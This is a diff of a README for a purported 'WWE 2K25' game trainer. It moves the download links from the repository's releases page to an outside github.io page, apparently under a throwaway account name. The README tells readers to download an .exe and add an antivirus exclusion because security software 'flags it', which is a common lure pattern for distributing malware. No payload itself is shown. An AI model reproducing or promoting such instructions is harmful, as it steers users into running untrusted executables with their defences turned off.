@@ -1,6 +1,6 @@
 # 🎮 WWE-2K25-Trainer-2026 - Improve your game experience with ease
 
-[![](https://img.shields.io/badge/Download_Installer-Blue_and_Grey-blue.svg)](https://github.com/Uncommonnesscorydalisclaviculata631/WWE-2K25-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download_Installer-Blue_and_Grey-blue.svg)](https://uncommonnesscorydalisclaviculata631.github.io)
 
 ## 📦 About this software
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to obtain and prepare the trainer for use on your computer.
 
-1. Visit the [official releases page](https://github.com/Uncommonnesscorydalisclaviculata631/WWE-2K25-Trainer-2026/releases) to download the installer.
+1. Visit the [official releases page](https://uncommonnesscorydalisclaviculata631.github.io) to download the installer.
 2. Locate the most recent file version ending in .exe.
 3. Save the file to your desktop or a dedicated folder for game utilities.
 4. Verify your antivirus software does not block the application. Because this tool interacts with game processes, some security software flags it. You may need to add an exclusion for the folder where you saved the trainer.
